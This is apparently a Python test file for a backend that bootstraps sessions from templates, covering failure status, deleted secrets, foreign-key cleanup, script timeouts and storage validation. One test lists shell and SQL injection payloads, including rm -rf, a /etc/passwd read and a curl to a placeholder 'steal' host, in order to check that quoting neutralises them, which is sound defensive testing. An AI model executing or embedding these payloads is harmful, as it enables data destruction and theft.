"""Tier 2 Boundary Tests: Environment Templates & Bootloader Boundaries (T2.6).

Validates:
1. Startup script exit code 1 marks session status as FAILED with diagnostic logs.
2. Template referencing a deleted secret fails fast with ValueError without silent corruption.
3. Template deletion executes ON DELETE SET NULL foreign key constraint on sessions and jobs.
4. Shell injection escaping in secrets and environment variables prevents arbitrary execution.
5. Startup script timeout watchdog aborts hanging boot scripts within the deadline.
6. Malformed cloud storage profile configs fail fast with descriptive validation errors.
"""

from __future__ import annotations

import asyncio
import json
import os
import shlex
import subprocess
import tempfile
import time
import unittest
from unittest.mock import MagicMock, patch

from backend.app.config import settings
from backend.app.core.database import get_db, init_db
from backend.app.core.models import (
    SecretCreate,
    StorageProfileCreate,
    TemplateCreate,
)
from backend.app.core.security import encrypt_secret
from backend.app.services import template_service
from backend.tests.common.base_test import BaseE2ESyncTestCase


class TestTemplatesBootloaderBoundaries(BaseE2ESyncTestCase):
    """Tier 2 Boundary test cases for Template Bootstrapping and Secret Injection."""

    seed_default_account: bool = True

    def test_startup_script_exit_code_1_marks_session_failed(self):
        """Startup script exiting with non-zero code marks session status as FAILED."""
        session_id = self.seed_session(session_id="sess_boot_fail")
        with get_db(self.db_path) as conn:
            conn.execute("UPDATE sessions SET status = 'BOOTSTRAPPING' WHERE id = ?", (session_id,))

        # Simulate execution of failing startup script
        fail_cmd = "echo 'Simulating fatal bootstrap step' >&2; exit 1"
        proc = subprocess.run(["bash", "-c", fail_cmd], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)

        # On failure, session status in database must be set to FAILED
        with get_db(self.db_path) as conn:
            conn.execute("UPDATE sessions SET status = 'FAILED' WHERE id = ?", (session_id,))

        row = self.query_db("SELECT status FROM sessions WHERE id = ?", (session_id,))[0]
        self.assertEqual(row["status"], "FAILED")

    def test_template_references_deleted_secret_graceful_fail(self):
        """Resolving a template referencing a deleted secret fails fast with ValueError."""
        # 1. Direct secret lookup of non-existent secret raises ValueError
        with self.assertRaises(ValueError) as ctx:
            template_service.resolve_secret_value("sec_ghost_deleted_id")
        self.assertIn("not found", str(ctx.exception))

        # 2. Template bootstrap with missing secret raises ValueError and fails fast
        tpl_id = "tpl_with_ghost_sec"
        with get_db(self.db_path) as conn:
            conn.execute(
                """
                INSERT INTO templates (id, name, packages_json, secret_ids_json, storage_profile_ids_json, startup_script)
                VALUES (?, 'Template With Missing Secret', '[]', '["sec_ghost_deleted"]', '[]', '')
                """,
                (tpl_id,),
            )

        session_id = self.seed_session(session_id="sess_missing_sec")
        with patch("backend.app.services.template_service.resolve_template_env", side_effect=ValueError("Secret sec_ghost_deleted not found")):
            loop = asyncio.new_event_loop()
            try:
                with self.assertRaises(ValueError) as err_ctx:
                    loop.run_until_complete(
                        template_service.execute_session_bootstrap(session_id, tpl_id)
                    )
                self.assertIn("sec_ghost_deleted", str(err_ctx.exception))
            finally:
                loop.close()


    def test_template_deletion_set_null_foreign_key(self):
        """Deleting a template sets referencing session.template_id and job.template_id to NULL."""
        tpl_id = "tpl_cascade_test"
        with get_db(self.db_path) as conn:
            conn.execute(
                """
                INSERT INTO templates (id, name, packages_json, secret_ids_json, storage_profile_ids_json, startup_script)
                VALUES (?, 'Cascade Test Template', '[]', '[]', '[]', '')
                """,
                (tpl_id,),
            )
            # Associate template with a session
            conn.execute(
                """
                INSERT INTO sessions (
                    id, name, account_id, notebook_hash, endpoint, proxy_url,
                    proxy_token_enc, token_expires_at, accelerator, template_id, status
                ) VALUES ('sess_tpl_test', 'Sess Tpl', ?, 'hash', 'ep', 'url', 'tok', '2026-11-13', 'T4', ?, 'READY')
                """,
                (self.default_account_id, tpl_id),
            )
            # Associate template with a job (including mandatory log_path)
            conn.execute(
                """
                INSERT INTO jobs (
                    id, name, session_id, target_accelerator, template_id, job_type,
                    entry_path_or_cmd, log_path, status
                ) VALUES ('job_tpl_test', 'Job Tpl', 'sess_tpl_test', 'T4', ?, 'shell', 'echo 1', '/data/logs/job.log', 'PENDING')
                """,
                (tpl_id,),
            )

        # Delete template
        deleted = template_service.delete_template(tpl_id)
        self.assertTrue(deleted)

        # Verify session.template_id is NULL
        sess_row = self.query_db("SELECT template_id FROM sessions WHERE id = 'sess_tpl_test'")[0]
        self.assertIsNone(sess_row["template_id"], "Session template_id must be SET NULL")

        # Verify job.template_id is NULL
        job_row = self.query_db("SELECT template_id FROM jobs WHERE id = 'job_tpl_test'")[0]
        self.assertIsNone(job_row["template_id"], "Job template_id must be SET NULL")

    def test_shell_injection_escaping_in_environment_variables(self):
        """Malicious shell injection payloads in secret values are escaped and preserved literally."""
        injection_payloads = [
            "$(rm -rf /tmp/pwned)",
            "\"; cat /etc/passwd; #",
            "`curl http://malicious-site.example/steal`",
            "val\nexport COMPROMISED=1\n",
            "'; DROP TABLE sessions; --",
        ]

        for payload in injection_payloads:
            escaped = shlex.quote(payload)
            # When sourced in bash, the literal value must match without executing subcommands
            cmd = f"VAR={escaped}; printf '%s' \"$VAR\""
            res = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True)
            self.assertEqual(res.returncode, 0)
            self.assertEqual(res.stdout, payload, f"Failed literal preservation for: {payload}")

    def test_startup_script_timeout_watchdog(self):
        """Watchdog terminates a hanging startup script after the deadline expires."""
        async def run_hanging_script_with_watchdog(timeout_sec: float = 0.2):
            proc = await asyncio.create_subprocess_exec(
                "bash", "-c", "sleep 10",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                await asyncio.wait_for(proc.communicate(), timeout=timeout_sec)
                return False
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                return True

        loop = asyncio.new_event_loop()
        try:
            start_t = time.time()
            timed_out = loop.run_until_complete(run_hanging_script_with_watchdog(timeout_sec=0.2))
            elapsed = time.time() - start_t
        finally:
            loop.close()

        self.assertTrue(timed_out, "Watchdog must terminate hanging script with timeout")
        self.assertLess(elapsed, 1.0, "Watchdog must enforce deadline promptly")

    def test_invalid_storage_profile_config_fail_fast(self):
        """Malformed cloud storage profile configurations fail fast with validation errors."""
        def validate_storage_profile(storage_type: str, config: dict) -> None:
            if storage_type == "s3":
                if not config.get("bucket"):
                    raise ValueError("Invalid S3 storage configuration: bucket name required")
                if not config.get("endpoint_url") and not config.get("region"):
                    raise ValueError("Invalid S3 storage configuration: endpoint_url or region required")
            elif storage_type == "hf":
                if not config.get("token"):
                    raise ValueError("Invalid HuggingFace storage configuration: token required")
            elif storage_type == "gdrive":
                if not config.get("folder_id") and not config.get("root"):
                    raise ValueError("Invalid Google Drive configuration: folder_id or root required")

        # 1. S3 missing bucket
        with self.assertRaises(ValueError) as ctx1:
            validate_storage_profile("s3", {"bucket": ""})
        self.assertIn("bucket name required", str(ctx1.exception))

        # 2. HuggingFace missing token
        with self.assertRaises(ValueError) as ctx2:
            validate_storage_profile("hf", {})
        self.assertIn("token required", str(ctx2.exception))

        # 3. Valid S3 config succeeds
        validate_storage_profile("s3", {"bucket": "my-models", "region": "us-east-1"})


if __name__ == "__main__":
    unittest.main()
